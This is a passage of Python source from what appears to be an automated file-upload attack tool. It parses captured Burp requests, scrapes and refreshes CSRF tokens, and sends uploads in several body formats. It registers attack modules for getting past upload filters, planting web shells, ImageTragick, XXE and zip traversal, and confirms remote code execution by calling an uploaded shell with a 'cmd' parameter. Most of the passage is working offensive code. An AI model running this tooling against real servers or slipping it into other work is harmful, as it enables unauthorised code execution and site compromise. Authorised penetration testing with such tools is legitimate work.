                # Timeouts / chunked / proxy blips may recover → exponential backoff.
                last_exc = e
                if i < attempts - 1:
                    self._backoff(i)
                    continue
                break
            except RequestException as e:
                last_exc = e
                if i < attempts - 1:
                    self._backoff(i)
                    continue
                break
            # Got a response. Back off and retry on rate-limit / unavailable.
            if resp.status_code in (429, 503) and i < attempts - 1:
                self._isleep(self._retry_after(resp))
                continue
            return resp
        raise last_exc if last_exc else RequestException("request failed")

    def upload(self, url: str, field: str, filename: str,
               content: bytes, mime: str,
               extra_data: dict = None,
               method: str = "POST") -> requests.Response:
        """Upload via direct URL + field name (no request template needed)."""
        files = {field: (filename, io.BytesIO(content), mime)}
        data  = extra_data or {}
        return self.send(method, url, files=files, data=data)

    def get(self, url: str) -> requests.Response:
        return self.send("GET", url)

    def baseline_404(self, upload_url: str) -> requests.Response:
        """GET a random nonexistent path to fingerprint 404 behavior."""
        fake = upload_url.rstrip("/") + "/" + "".join(
            random.choices(string.ascii_lowercase, k=16)) + "_nonexistent.xyz"
        try:
            return self.get(fake)
        except RequestException:
            return None

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 6 — REQUEST FILE PARSER & FORM DETECTOR
# ─────────────────────────────────────────────────────────────────────────────

def _templatize_request(raw: str):
    """Insert §FILENAME§/§MIMETYPE§/§CONTENT§ markers into the multipart file
    part of a raw request that doesn't already contain them.

    Without this, a captured Burp request (which has none of the markers) would
    re-send the original file byte-for-byte on every "variant". Returns
    (new_raw, ok) — ok is False if the file part could not be located.
    """
    m_b = re.search(r'boundary=(?:"([^"]+)"|([^\s;]+))', raw, re.I)
    if not m_b:
        return raw, False
    boundary = m_b.group(1) or m_b.group(2)

    m_fn = re.search(r'(filename=")([^"]*)(")', raw, re.I)
    if not m_fn:
        return raw, False

    nl = "\r\n" if "\r\n" in raw else "\n"

    # 1) filename="orig.jpg" -> filename="§FILENAME§"
    raw = raw[:m_fn.start(2)] + "§FILENAME§" + raw[m_fn.end(2):]

    idx = raw.index("§FILENAME§")
    hdr_term = raw.find(nl + nl, idx)
    if hdr_term == -1:
        return raw, False

    # 2) Content-Type of the file part (if present) -> §MIMETYPE§
    part_hdr = raw[idx:hdr_term]
    new_hdr, n_ct = re.subn(r'(?i)(Content-Type:\s*)[^\r\n]+',
                            r'\g<1>§MIMETYPE§', part_hdr, count=1)
    if n_ct:
        raw = raw[:idx] + new_hdr + raw[hdr_term:]
        hdr_term = raw.find(nl + nl, raw.index("§FILENAME§"))

    # 3) part body (between header terminator and next boundary) -> §CONTENT§
    body_start = hdr_term + len(nl + nl)
    body_end   = raw.find(nl + "--" + boundary, body_start)
    if body_end == -1:
        return raw, False
    raw = raw[:body_start] + "§CONTENT§" + raw[body_end:]
    return raw, True


def _templatize_csrf(raw: str):
    """Replace the value of a multipart form field whose name looks like a CSRF
    token with a §CSRF§ marker, so the token can be auto-refreshed per request
    instead of being replayed stale. Returns (new_raw, field_name, captured_value)
    — or (raw, None, None) if no token field is found / a marker already exists."""
    if "§CSRF§" in raw:
        return raw, None, None
    m_b = re.search(r'boundary=(?:"([^"]+)"|([^\s;]+))', raw, re.I)
    if not m_b:
        return raw, None, None
    boundary = m_b.group(1) or m_b.group(2)
    nl    = "\r\n" if "\r\n" in raw else "\n"
    delim = nl + "--" + boundary
    for hm in re.finditer(
            r'Content-Disposition:\s*form-data;\s*name="([^"]+)"([^\r\n]*)',
            raw, re.I):
        name, rest = hm.group(1), hm.group(2)
        if "filename" in rest.lower():        # skip the file part
            continue
        if not CSRF_NAME_RE.search(name):
            continue
        hdr_term = raw.find(nl + nl, hm.end())
        if hdr_term == -1:
            continue
        val_start = hdr_term + len(nl + nl)
        val_end   = raw.find(delim, val_start)
        if val_end == -1:
            continue
        captured = raw[val_start:val_end]
        new_raw  = raw[:val_start] + "§CSRF§" + raw[val_end:]
        return new_raw, name, captured
    return raw, None, None


def parse_request_file(path: str, scheme: str = "https") -> dict:
    """Parse a Burp raw HTTP request file.
    Returns: {method, host, path, headers, body_template, url}
    """
    with open(path, "rb") as f:
        raw = f.read().decode("latin-1")

    # If the request carries no upload markers, auto-insert them into the file
    # part so each variant actually changes the uploaded filename/content/mime.
    markers = ("§FILENAME§", "§CONTENT§", "§MIMETYPE§",
               "*filename*", "*content*", "*data*", "*mimetype*")
    if not any(mk in raw for mk in markers):
        templated, ok = _templatize_request(raw)
        if ok:
            raw = templated
            info("request-file: auto-inserted §FILENAME§/§CONTENT§/§MIMETYPE§ markers")
        else:
            warn("request-file: no markers found and file part not auto-detected — "
                 "add §FILENAME§/§CONTENT§/§MIMETYPE§ manually")

    # Auto-templatize a CSRF token field so it is refreshed per request instead
    # of replayed stale (captured value is kept as the initial token).
    raw, csrf_field, csrf_value = _templatize_csrf(raw)
    if csrf_field:
        info(f"request-file: auto-inserted §CSRF§ marker for field '{csrf_field}'")

    # Normalize the TEMPLATE's line endings to CRLF. HTTP request bodies — and
    # especially multipart part delimiters — must be CRLF-separated; a capture
    # saved with bare LF (common when a file is edited/round-tripped outside
    # Burp) makes a strict server parser see the whole body as one blob and fail
    # to extract any field (→ "Missing parameter 'csrf'"). This runs AFTER the
    # markers are inserted, so the real file bytes (injected later at §CONTENT§)
    # keep their own line endings and are never altered.
    if "\r\n" not in raw:
        raw = re.sub(r"\r\n|\r|\n", "\r\n", raw)
        info("request-file: normalized bare-LF line endings to CRLF (multipart safe)")

    # Split headers from body
    sep = "\r\n\r\n" if "\r\n\r\n" in raw else "\n\n"
    header_part, _, body = raw.partition(sep)

    lines = header_part.splitlines()
    first = lines[0].split()
    method = first[0] if first else "POST"
    path   = first[1] if len(first) > 1 else "/"

    headers = {}
    host    = ""
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()
            if k.strip().lower() == "host":
                host = v.strip()

    url    = f"{scheme}://{host}{path}"

    return {
        "method":     method,
        "host":       host,
        "path":       path,
        "headers":    headers,
        "body":       body,
        "url":        url,
        "raw":        raw,
        "csrf_field": csrf_field,
        "csrf_value": csrf_value,
    }

def detect_upload_form(url: str, session: requests.Session) -> dict:
    """Auto-detect upload form using BeautifulSoup."""
    if not BS4:
        return None
    try:
        r = session.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        for form in soup.find_all("form"):
            inputs = form.find_all("input", {"type": "file"})
            if inputs:
                field  = inputs[0].get("name", "file")
                action = form.get("action", "")
                return {
                    "field":      field,
                    "action_url": urljoin(url, action),
                    "method":     form.get("method", "POST").upper(),
                }
    except (RequestException, ValueError):
        pass
    return None

# Field/cookie names that usually carry a CSRF token (framework-agnostic).
CSRF_NAME_RE = re.compile(
    r"csrf|xsrf|_token\b|authenticity_token|csrfmiddlewaretoken|"
    r"requestverificationtoken|nonce|anti.?forgery", re.I)


def harvest_csrf_tokens(html: str) -> dict:
    """Scrape likely CSRF tokens from HTML: hidden <input> fields and
    <meta name=csrf-token content=…>. Pure-regex (no bs4 dependency)."""
    found = {}
    if not html:
        return found
    for tag in re.findall(r"<input\b[^>]*>", html, re.I):
        nm = re.search(r'name\s*=\s*["\']?([^"\'\s>]+)', tag, re.I)
        if not (nm and CSRF_NAME_RE.search(nm.group(1))):
            continue
        val = re.search(r'value\s*=\s*"([^"]*)"|value\s*=\s*\'([^\']*)\'', tag, re.I)
        v = (val.group(1) or val.group(2)) if val else ""
        if v:                       # never store an empty token (would clobber a good one)
            found[nm.group(1)] = v
    for tag in re.findall(r"<meta\b[^>]*>", html, re.I):
        nm = re.search(r'name\s*=\s*["\']?([^"\'\s>]+)', tag, re.I)
        ct = re.search(r'content\s*=\s*"([^"]*)"|content\s*=\s*\'([^\']*)\'', tag, re.I)
        if nm and ct and CSRF_NAME_RE.search(nm.group(1)):
            v = ct.group(1) or ct.group(2)
            if v:
                found[nm.group(1)] = v
    return found

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 7 — UPLOAD CONTEXT (glue layer)
# ─────────────────────────────────────────────────────────────────────────────

class UploadContext:
    """Encapsulates everything needed to send a single upload attempt."""

    def __init__(self, engine: HttpEngine, opts, output: OutputManager,
                 interrupt_event=None):
        self.engine     = engine
        self.opts       = opts
        self.output     = output
        self._lock      = threading.Lock()
        self.stop_flag  = threading.Event()

        # Parsed from request file OR direct URL
        self.upload_url = opts.url or ""
        self.field      = opts.field or "file"
        self.req_info   = None
        if opts.request_file:
            self.req_info   = parse_request_file(
                opts.request_file, getattr(opts, "scheme", None) or "https")
            self.upload_url = self.req_info["url"]

        # Extra POST fields (e.g. CSRF tokens) from -d/--data: "csrf=tok&a=b"
        self.extra_data = dict(parse_qsl(opts.extra_data)) if opts.extra_data else {}

        # CSRF auto-handling: field tokens are scraped from the target page
        # (hidden inputs / meta) and refreshed when a request looks token-blocked.
        # Double-submit *headers* are NEVER guessed from cookie names — in -r mode
        # the captured request's own headers are replayed verbatim, so a real
        # X-CSRF/X-XSRF header is already on the wire. A header is synthesized only
        # when named explicitly (--csrf-header) or, with --csrf-refresh, detected
        # from evidence in the capture (a header whose value echoes a cookie).
        self.csrf          = {}
        self.csrf_headers  = {}
        self._csrf_echo    = {}     # header-name -> source cookie-name (no guessing)
        self._csrf_logged  = False
        self._csrf_field   = None   # the §CSRF§ field templatized from a -r file
        self.csrf_source   = getattr(opts, "csrf_url", None)

        # Explicit double-submit mappings: --csrf-header NAME=COOKIE (repeatable).
        for m in getattr(opts, "csrf_headers_map", None) or []:
            if "=" in m:
                hname, cname = (s.strip() for s in m.split("=", 1))
                if hname and cname:
                    self._csrf_echo[hname] = cname

        if self.req_info:
            # 1) Load the captured Cookie header into the session so the CSRF
            #    scrape GET (and any GET) runs as the authenticated user.
            hdrs_ci = {k.lower(): v for k, v in self.req_info["headers"].items()}
            cookie_pairs = {}
            for kv in hdrs_ci.get("cookie", "").split(";"):
                kv = kv.strip()
                if "=" in kv:
                    k, v = kv.split("=", 1)
                    k, v = k.strip(), v.strip()
                    self.engine.session.cookies.set(k, v)
                    cookie_pairs[k] = v
            # 2) Seed the captured token + remember its field for §CSRF§.
            if self.req_info.get("csrf_field"):
                self._csrf_field = self.req_info["csrf_field"]
                self.csrf[self._csrf_field] = self.req_info.get("csrf_value") or ""
            # 3) Scrape tokens from the page that holds them (Referer/Origin),
            #    not the POST-only upload endpoint.
            if not self.csrf_source:
                self.csrf_source = (hdrs_ci.get("referer")
                                    or (hdrs_ci["origin"].rstrip("/") + "/"
                                        if hdrs_ci.get("origin") else None))
            # 4) --csrf-refresh: detect a rotating double-submit header from
            #    EVIDENCE — a captured request header whose value equals a cookie
            #    value (token-named on either side). Records header->cookie so the
            #    header tracks the cookie if it rotates; no naming convention.
            if getattr(opts, "csrf_refresh", False):
                for hname, hval in self.req_info["headers"].items():
                    if hname.lower() in ("cookie", "host"):
                        continue
                    hv = (hval or "").strip()
                    if not hv:
                        continue
                    for ck, cv in cookie_pairs.items():
                        if cv == hv and (CSRF_NAME_RE.search(hname)
                                         or re.search(r"xsrf|csrf", ck, re.I)):
                            self._csrf_echo[hname] = ck
                            break

        # Seed any mapped double-submit headers from the current cookie values.
        self._sync_csrf_headers()

        # Host-health circuit breaker — abort a target after a run of dead
        # connections instead of grinding through thousands of failing requests.
        # A hard "connection refused / DNS / no route" trips faster than a soft
        # timeout, since a truly-down host refuses every connection.
        self._conn_fail  = 0
        self._last_error = None
        self._aborted    = False
        # Dedicated host-down event (separate from stop_flag, which also means
        # "stop on finding"). Wired into the engine so sends fail fast once down.
        self._down_event = threading.Event()
        self.engine.abort_event     = self._down_event
        self.engine.interrupt_event = interrupt_event

        self.baseline_resp = None

    # ── CSRF auto-fix ────────────────────────────────────────────────────────
    def _csrf_enabled(self) -> bool:
        return not getattr(self.opts, "no_csrf_auto", False)

    def _cookie_value(self, name: str):
        """Current value of a session cookie by name (last wins), or None."""
        val = None
        try:
            for c in self.engine.session.cookies:
                if c.name == name:
                    val = c.value
        except Exception:
            pass
        return val

    def _sync_csrf_headers(self):
        """Refresh mapped double-submit headers from their source cookie's CURRENT
        value. The mapping comes only from --csrf-header (explicit) or --csrf-refresh
        (evidence from a -r capture) — header names are never guessed."""
        if not self._csrf_echo:
            return
        with self._lock:
            for header, cookie in self._csrf_echo.items():
                val = self._cookie_value(cookie)
                if val:
                    self.csrf_headers[header] = val

    def refresh_csrf(self, url: str = None):
        """GET the form page, scrape CSRF field tokens, and update the injected
        set. Also re-syncs any mapped double-submit headers from rotated cookies.
        Best-effort — never raises."""
        if not self._csrf_enabled():
            return
        url = url or getattr(self.opts, "csrf_url", None) or self.csrf_source or self.upload_url
        if not url:
            return
        try:
            r = self.engine.get(url)
        except Exception:
            return
        tokens = harvest_csrf_tokens(getattr(r, "text", "") or "")
        # Keep double-submit headers in lock-step with any cookie rotation the GET
        # just triggered (only if a mapping was explicitly given / evidenced).
        self._sync_csrf_headers()
        if not tokens and not self.csrf_headers:
            return
        with self._lock:
            self.csrf.update(tokens)
            first = not self._csrf_logged
            self._csrf_logged = True
        if first and (tokens or self.csrf_headers):
            shown = ", ".join(sorted(set(list(tokens) + list(self.csrf_headers))))
            success(f"CSRF auto-detected: {shown} (auto-refreshed on token errors)")

    @staticmethod
    def _looks_like_csrf_block(resp) -> bool:
        """Heuristic: does this response look like a CSRF/token rejection?
        Conservative — only fires on token-specific signals (or Laravel's 419),
        so it won't retry-storm a target that simply 403s everything."""
        if resp is None:
            return False
        if resp.status_code == 419:                      # Laravel: token expired
            return True
        if resp.status_code in (400, 401, 403, 422):
            body = (getattr(resp, "text", "") or "")[:3000].lower()
            return any(k in body for k in (
                "csrf", "xsrf", "_token", "token mismatch", "invalid token",
                "expired token", "verification token", "anti-forgery"))
        return False

    def _track_health(self, resp):
        """Trip the circuit breaker after a streak of dead connections. A hard
        connection failure (refused / DNS / no route) means the host is down, so
        we bail after 3; a soft failure (timeout, 5xx-ish) gets the full 10."""
        with self._lock:
            if resp is None:
                self._conn_fail += 1
                hard  = isinstance(self._last_error, ConnectionError)
                limit = 3 if hard else 10
                if self._conn_fail >= limit and not self._aborted:
                    self._aborted = True
                    self._down_event.set()       # make in-flight engine sends fail fast
                    self.stop_flag.set()
                    why = "unreachable" if hard else "not responding"
                    warn(f"Host appears {why} ({self._conn_fail} consecutive "
                         f"failures) — aborting this target")
            else:
                self._conn_fail  = 0
                self._last_error = None

    def fingerprint_baseline(self):
        self.baseline_resp = self.engine.baseline_404(
            getattr(self.opts, "upload_dir", "/") or "/"
        )
        if self.baseline_resp and self.baseline_resp.status_code == 200:
            warn("Non-existent paths return 200 — false positive risk high")

    def send(self, filename: str, content: bytes, mime: str,
             method: str = None) -> requests.Response:
        """Send one upload, with automatic CSRF refresh-and-retry and host-health
        tracking. Returns Response or None."""
        resp = self._send_once(filename, content, mime, method)
        # If it looks like a CSRF/token rejection, re-scrape a fresh token and
        # retry exactly once (covers rotating one-time tokens).
        if self._csrf_enabled() and self._looks_like_csrf_block(resp):
            self.refresh_csrf()
            retry = self._send_once(filename, content, mime, method)
            if retry is not None:
                resp = retry
        self._track_health(resp)
        return resp

    def _send_once(self, filename: str, content: bytes, mime: str,
                   method: str = None) -> requests.Response:
        """One physical upload attempt (no CSRF retry). Returns Response or None."""
        m = method or self.opts.method or "POST"
        # Merge auto-detected CSRF tokens; explicit -d/--data values win.
        with self._lock:
            merged_data    = {**self.csrf, **self.extra_data}
            merged_headers = dict(self.csrf_headers)
        try:
            if self.req_info:
                # Rebuild raw request with substitutions
                raw = (self.req_info["raw"]
                       .replace("§FILENAME§",  filename)
                       .replace("§CONTENT§",   content.decode("latin-1"))
                       .replace("§MIMETYPE§",  mime)
                       .replace("*filename*",  filename)
                       .replace("*content*",   content.decode("latin-1"))
                       .replace("*data*",      content.decode("latin-1")))
                # Inject the freshest CSRF token where a §CSRF§ marker was placed.
                # Resolve a NON-EMPTY token (prefer the templatized field, then any
                # scraped token, then the captured value) so we never send an empty
                # csrf= — which servers report as "Missing parameter 'csrf'".
                if "§CSRF§" in raw:
                    tok = (self.csrf.get(self._csrf_field) or "").strip()
                    if not tok:
                        tok = next((v for v in self.csrf.values() if v), "")
                    if not tok:
                        tok = self.req_info.get("csrf_value") or ""
                    raw = raw.replace("§CSRF§", tok)

                scheme  = getattr(self.opts, "scheme", None) or "https"
                url_str = f"{scheme}://{self.req_info['host']}{self.req_info['path']}"
                hdrs    = dict(self.req_info["headers"])
                hdrs.update(merged_headers)

                # Drop the original Content-Length: the body changed after marker
                # substitution, so let requests recompute it (a stale length makes
                # the server truncate the body or hang waiting for more bytes).
                for k in list(hdrs.keys()):
                    if k.lower() == "content-length":
                        del hdrs[k]

                sep  = "\r\n\r\n" if "\r\n\r\n" in raw else "\n\n"
                body = raw.partition(sep)[2].encode("latin-1")
                return self.engine.send(m, url_str, data=body, headers=hdrs)
            else:
                verb, url, kw = build_upload_request(
                    self.opts, self.upload_url, self.field, filename, content,
                    mime, merged_data, verb=(method or None))
                if merged_headers:
                    kw.setdefault("headers", {})
                    kw["headers"].update(merged_headers)
                return self.engine.send(verb, url, **kw)
        except Exception as e:
            self._last_error = e          # let the breaker classify host-down vs soft
            failure(f"Request error: {e}")
            return None

    def is_success(self, resp: requests.Response) -> bool:
        if resp is None:
            return False
        if self.opts.failure_regex:
            if re.search(self.opts.failure_regex, resp.text, re.I):
                return False
        if self.opts.success_regex:
            return bool(re.search(self.opts.success_regex, resp.text, re.I))
        # No regex: match the configured status, and also treat a redirect as
        # success — many upload handlers reply 3xx to a "success" page.
        return (resp.status_code == self.opts.status_code
                or 300 <= resp.status_code < 400)

    @staticmethod
    def _is_image_response(resp) -> bool:
        """Heuristic: does the response look like a valid upright image was served
        (not executed as code)? Checks Content-Type header + magic bytes."""
        if resp is None:
            return False
        ct = resp.headers.get("Content-Type", "").lower()
        image_ct = ("image/jpeg", "image/png", "image/gif", "image/bmp",
                    "image/webp", "image/svg+xml", "image/x-icon")
        if ct not in image_ct:
            return False
        body = resp.content[:12]
        for sig in (b"\xFF\xD8\xFF", b"\x89PNG", b"GIF8", b"BM",
                    b"RIFF", b"\x00\x00\x01\x00", b"<svg"):
            if body.startswith(sig):
                return True
        return False

    def _stored_url(self, filename: str) -> str:
        """Build the URL a just-uploaded *filename* should be retrievable at, from
        --upload-dir. Returns "" when --upload-dir is unset. Relative dirs are
        resolved against the upload endpoint's parent path. Shared by verify_exec
        (RCE trigger) and the SVG canary (reachability check)."""
        if not self.opts.upload_dir:
            return ""
        url = self.opts.upload_dir.rstrip("/") + "/" + filename.lstrip("/")
        if not url.startswith("http"):
            url = self.upload_url.rstrip("/").rsplit("/", 1)[0] + "/" + url.lstrip("/")
        return url

    def verify_exec(self, filename: str, upload_resp=None, probe_str: str = None) -> bool:
        """GET the uploaded file, confirm RCE via 3 conditions:
        1) 200 OK from the shell URL
        2) Response body size differs from the original upload response
        3) Response is NOT a valid upright image (code executed, not served raw)"""
        url = self._stored_url(filename)
        if not url:
            return False
        # Trigger the uploaded shell by passing a benign, output-producing command
        # on the configurable parameter (default 'cmd'). Match a custom --shell that
        # reads a different parameter via --cmd-param. The random echo doubles as a
        # cache-buster so the body reliably differs from the original upload.
        param = getattr(self.opts, "cmd_param", "cmd") or "cmd"
        sep   = "&" if "?" in url else "?"
        url   = url + sep + urlencode({param: "echo " + self.rnd_name(8)})
        try:
            r = self.engine.get(url)

            if r.status_code != 200:
                return False

            upload_size = len(getattr(upload_resp, "content", b"") or b"")
            shell_size  = len(getattr(r, "content", b"") or b"")
            if shell_size == upload_size and upload_size > 0:
                return False

            if self._is_image_response(r):
                return False

            return True
        except RequestException:
            pass
        return False

    def _should_abort(self) -> bool:
        """True when workers should stop their inner variant loop immediately.
        Covers both the normal stop_flag (first-hit mode, host-down) and a
        user interrupt (Ctrl+C), so brute_force mode is also interruptible."""
        if self.stop_flag.is_set():
            return True
        ev = self.engine.interrupt_event
        return ev is not None and ev.is_set()

    def rnd_name(self, length: int = 10) -> str:
        return "".join(random.choices(string.ascii_lowercase, k=length))

    def dump_response(self, resp):
        """Print a truncated response body when -R/--response is set."""
        if resp is None or not getattr(self.opts, "show_response", False):
            return
        with self._lock:
            print()
            print(f"  {DG}── response [{resp.status_code}] (first 500 bytes) ──{RS}")
            print(f"  {DG}{resp.text[:500]}{RS}")

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 8 — MODULE REGISTRY
# ─────────────────────────────────────────────────────────────────────────────

MODULES = {}  # name → function

def module(name: str):
    """Decorator to register an attack module."""
    def decorator(fn):
        MODULES[name] = fn
        return fn
    return decorator

# ─────────────────────────────────────────────────────────────────────────────
# SECTION 8b — UPLOAD TRANSPORTS  (body shapes beyond multipart/form-data)
#
# UpMap historically auto-built only `multipart/form-data`. These transports
# cover the single-request upload styles documented in upload-styles.md (raw
# PUT, JSON/base64, JSON/plaintext, XML/SOAP, urlencoded, and a fully custom
# template). Each transport advertises CAPABILITIES; each module declares what
# it REQUIRES. A module with 0% probability in the chosen transport (e.g.
# mime_spoofing where there is no per-file Content-Type) is pruned up front.
# ─────────────────────────────────────────────────────────────────────────────

# Capabilities a transport can offer:
#   filename       — request carries a client-controlled name the server may use
#                    to store/route the file (extension & name tricks matter).
#   per_file_mime  — a per-FILE Content-Type exists, validatable independently of
#                    the request Content-Type (only multipart has this).
#   binary         — body can carry arbitrary bytes (magic headers, real images,
#                    zips, polyglots). False for text-only bodies (JSON plaintext).
TRANSPORT_CAPS = {
    "multipart":    {"filename", "per_file_mime", "binary"},
    "raw":          {"filename", "binary"},          # filename via URL path
    "json-b64":     {"filename", "binary"},
    "json-raw":     {"filename"},                    # text-only: NO binary
    "xml-b64":      {"filename", "binary"},
    "form-b64":     {"filename", "binary"},
    "request-file": {"filename", "per_file_mime", "binary"},  # -r replay: never prune
}

# What each module needs to have any chance of working. Modules absent here have
# no structural requirement and always run. Bias is conservative — a cap is
# listed only when the attack is *impossible* without it, so real findings are
# never hidden (use --no-method-filter to disable pruning entirely).
MODULE_REQUIREMENTS = {
    # Extension/name is the exploit → needs a client-controlled filename.
    "extension_shuffle":       {"filename"},
    "double_extension":        {"filename"},
    "stripping_extension":     {"filename"},
    "discrepancy":             {"filename"},
    "null_byte_cutoff":        {"filename"},
    "name_overflow":           {"filename"},
    "special_char_bypass":     {"filename"},
    "path_traversal_filename": {"filename"},
    "wordlist_fuzzer":         {"filename"},
    "htaccess_overwrite":      {"filename"},
    "web_config_overwrite":    {"filename"},
    "config_file_upload":      {"filename"},
    "php_rce":                 {"filename"},
    "jsp_rce":                 {"filename"},
    "asp_rce":                 {"filename"},
    "cgi_rce":                 {"filename"},
    "php_obfuscation":         {"filename"},
    "asp_obfuscation":         {"filename"},
    "jsp_obfuscation":         {"filename"},
    # Per-file Content-Type spoof → only multipart has per-part MIME.
    "mime_spoofing":           {"per_file_mime"},
    # Binary magic bytes / real image/zip/PDF structure → needs a binary body.
    "imagetragick_sleep":      {"binary"},
    "imagetragick_oast":       {"binary"},
    "imagemagick_mvg":         {"binary"},
    "ghostscript":             {"binary"},
    "libavformat_ssrf":        {"binary"},
    "pdf_exploit":             {"binary"},
    "polyglot_image_rce":      {"binary"},
    "image_steganography":     {"binary"},
    "zip_traversal":           {"binary"},
    # "zip_split_obfuscation":   {"binary"},   # disabled module
    "docx_xxe":                {"binary"},
    "dos_crashfiles":          {"binary"},
    "swf_xss":                 {"binary"},
    "fingerping":              {"binary"},
    # RCE polyglot: needs both a code extension AND real image bytes.
    "polyglot_php_jpeg":       {"filename", "binary"},
}

# Human-readable reason for each missing capability (shown in the skip notice).
_CAP_REASON = {
    "filename":      "no client-controlled filename",
    "per_file_mime": "no per-file Content-Type",
    "binary":        "text-only body (no binary payloads)",
}

# ── Language routing (-E / --extension) ──────────────────────────────────────
# Modules that target one specific server language. They only make sense when
# the target runs that language, so -E routes execution to the matching ones
# (e.g. -E asp runs asp_rce + web_config_overwrite, not php_rce/jsp_rce/cgi_rce).
# Modules NOT listed here are language-agnostic (the extension-bypass family
# adapts via opts.extension; content exploits like SVG XSS work anywhere) and
# always run. Routing is skipped when the user names modules explicitly with -m.
MODULE_LANG = {
    "php_rce":             "php",
    "php_obfuscation":     "php",
    "polyglot_php_jpeg":   "php",
    "htaccess_overwrite":  "php",   # .htaccess → Apache + mod_php
    "asp_rce":             "asp",
    "asp_obfuscation":     "asp",
    "web_config_overwrite": "asp",  # web.config → IIS / ASP.NET
    "jsp_rce":             "jsp",
    "jsp_obfuscation":     "jsp",
    "cgi_rce":             "perl",  # perl/python/ruby CGI family
}

def target_lang(ext: str) -> str:
    """Normalize an -E/--extension value to a language family key."""
    e = (ext or "php").lower().lstrip(".")
    if e in ("php", "phtml", "phar", "pht", "php2", "php3", "php4",
             "php5", "php6", "php7", "phps", "phtm"):
        return "php"
    if e in ("asp", "aspx", "asa", "asax", "ashx", "asmx", "cer", "config"):
        return "asp"
    if e in ("jsp", "jspx", "jsw", "jsv", "jspf"):
        return "jsp"
    if e in ("cfm", "cfml", "cfc", "coldfusion", "dbm"):
        return "coldfusion"
    if e in ("pl", "cgi", "perl", "py", "python", "rb", "ruby"):
        return "perl"
    return e

def apply_language_filter(run_list: list, opts):
    """Drop language-specific modules that don't match the -E target language.
    Returns (kept, skipped_by_lang). Language-agnostic modules are always kept."""
    lang = target_lang(opts.extension)
    kept, skipped = [], []
    for m in run_list:
        mlang = MODULE_LANG.get(m)
        if mlang and mlang != lang:
            skipped.append(m)
        else:
            kept.append(m)
    return kept, skipped


def _url_with_filename(url: str, filename: str) -> str:
    """Path-based styles: substitute {{FILENAME}} in the URL, else append it."""
    if "{{FILENAME}}" in (url or ""):
        return url.replace("{{FILENAME}}", quote(filename))
    return (url or "").rstrip("/") + "/" + quote(filename)


def _render_template(template: str, filename: str, content: bytes,
                     mime: str, field: str) -> bytes:
    """Substitute body-template placeholders. latin-1 keeps {{FILE_RAW}} bytes
    byte-exact so binary payloads survive when {{FILE_RAW}} is used."""
    s = (template
         .replace("{{FILE_B64}}", base64.b64encode(content).decode("ascii"))
         .replace("{{FILE_RAW}}", content.decode("latin-1"))
         .replace("{{FILENAME}}", filename)
         .replace("{{MIME}}",     mime)
         .replace("{{FIELD}}",    field))
    return s.encode("latin-1")


def resolve_verb(opts) -> str:
    """HTTP verb for the new transports. Precedence: --method-verb > -P/-Pa >
    transport default (raw=PUT, everything else=POST)."""
    if getattr(opts, "method_verb", None):
        return opts.method_verb
    if getattr(opts, "method", "POST") != "POST":   # user set -P/--put or -Pa
        return opts.method
    return "PUT" if getattr(opts, "transport", "") == "raw" else "POST"


def detect_transport(opts, req_info) -> str:
    """Pick the concrete transport. -r replays verbatim ('request-file'); an
    explicit --body-template/--method wins; otherwise auto-detect for -u."""
    if req_info:
        return "request-file"
    if getattr(opts, "body_template", None):
        return "template"
    m = getattr(opts, "upload_method", "auto") or "auto"
    if m != "auto":
        return m
    # auto, -u mode: a {{FILENAME}} in the URL means a path-based (raw) upload;
    # otherwise default to multipart (HTML can't reliably reveal a JSON/XML API).
    if opts.url and "{{FILENAME}}" in opts.url:
        return "raw"
    return "multipart"


def transport_caps(opts) -> set:
    """Capabilities of the resolved transport (for module pruning)."""
    t = getattr(opts, "transport", "multipart")
    if t == "template":
        tpl  = opts.body_template or ""
        caps = set()
        if "{{FILENAME}}" in tpl or "{{FILENAME}}" in (opts.url or ""):
            caps.add("filename")
        # Binary unless the file is embedded purely as {{FILE_RAW}} text.
        if "{{FILE_B64}}" in tpl or "{{FILE_RAW}}" not in tpl:
            caps.add("binary")
        return caps
    return set(TRANSPORT_CAPS.get(t, {"filename", "per_file_mime", "binary"}))


def build_upload_request(opts, url: str, field: str, filename: str,
                         content: bytes, mime: str, extra_data: dict,
                         verb: str = None):
    """Turn one upload attempt into (verb, url, send_kwargs) for the resolved
    transport. send_kwargs feeds HttpEngine.send() (files=/data=/headers=)."""
    t     = getattr(opts, "transport", "multipart")
    verb  = verb or resolve_verb(opts)
    field = field or "file"
    extra = extra_data or {}

    if t == "multipart":
        files = {field: (filename, io.BytesIO(content), mime)}
        return verb, url, {"files": files, "data": dict(extra)}

    if t == "raw":
        ct = opts.content_type or mime or "application/octet-stream"
        return verb, _url_with_filename(url, filename), {
            "data": content, "headers": {"Content-Type": ct}}

    if t == "json-b64":
        body = {"filename": filename, "content_type": mime,
                field: base64.b64encode(content).decode("ascii")}
        body.update(extra)
        return verb, _url_with_filename(url, filename), {
            "data": json.dumps(body).encode("utf-8"),
            "headers": {"Content-Type": "application/json"}}

    if t == "json-raw":
        try:
            text = content.decode("utf-8")
        except UnicodeDecodeError:
            text = content.decode("latin-1")
        body = {"filename": filename, field: text}
        body.update(extra)
        return verb, _url_with_filename(url, filename), {
            "data": json.dumps(body).encode("utf-8"),
            "headers": {"Content-Type": "application/json"}}

    if t == "xml-b64":
        b64 = base64.b64encode(content).decode("ascii")
        xml = (f"<upload><filename>{xml_escape(filename)}</filename>"
               f"<{field}>{b64}</{field}></upload>")
        return verb, _url_with_filename(url, filename), {
            "data": xml.encode("utf-8"),
            "headers": {"Content-Type": "application/xml"}}

    if t == "form-b64":
        d = {"filename": filename,
             field: base64.b64encode(content).decode("ascii")}
        d.update(extra)
        return verb, _url_with_filename(url, filename), {
            "data": urlencode(d),
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}}

    if t == "template":
        ct = opts.content_type or "application/octet-stream"
        return verb, _url_with_filename(url, filename), {
            "data": _render_template(opts.body_template or "", filename,
                                     content, mime, field),
            "headers": {"Content-Type": ct}}

    # Unknown → multipart fallback.
    files = {field: (filename, io.BytesIO(content), mime)}
    return verb, url, {"files": files, "data": dict(extra)}


def apply_method_filter(pending: list, caps: set, opts):
    """Split pending modules into (run, skipped) by transport capability.
    skipped maps module -> set(missing caps). No-op when --no-method-filter."""
